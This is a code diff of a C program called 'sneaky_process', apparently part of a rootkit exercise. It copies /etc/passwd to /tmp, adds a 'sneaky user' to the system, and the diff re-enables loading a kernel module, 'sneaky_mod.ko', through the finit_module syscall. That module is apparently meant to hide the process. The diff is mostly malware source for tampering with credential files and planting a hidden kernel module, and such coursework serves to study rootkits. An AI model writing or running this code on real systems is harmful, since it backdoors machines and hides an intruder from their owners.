@@ -42,25 +42,26 @@ void addSneakyUser(){
 
 
 void loadSneakyModule(int pid){
-  int fd = open("sneaky_mod.c", O_RDONLY);
+  int fd = open("sneaky_mod.ko", O_RDONLY);
+  
   int res = syscall(__NR_finit_module, fd, "", 0);
   if (res != 0) {
-    printf("Sneaky Module is not loaded");
+    printf("Sneaky Module is not loaded\n");
     return EXIT_FAILURE;
   }
-  printf("Sneaky Module is loaded");
+  printf("Sneaky Module is loaded\n");
   close(fd);
 } 
 
 int main(int argc, char* argv[]){
   int current_pid = getpid();
   printf("sneaky_process pid = %d\n", current_pid);
-  printf("Copying file");
+  printf("Copying file\n");
   copyfile("/etc/passwd", "/tmp/passwd");
-  printf("Adding sneaky user");
+  printf("Adding sneaky user\n");
   addSneakyUser();
-  printf("Loading Sneaky user");
-  // loadSneakyModule(current_pid);
+  printf("Loading Sneaky user\n");
+  loadSneakyModule(current_pid);
   while(1){
     char input;
     scanf("%c", &input);
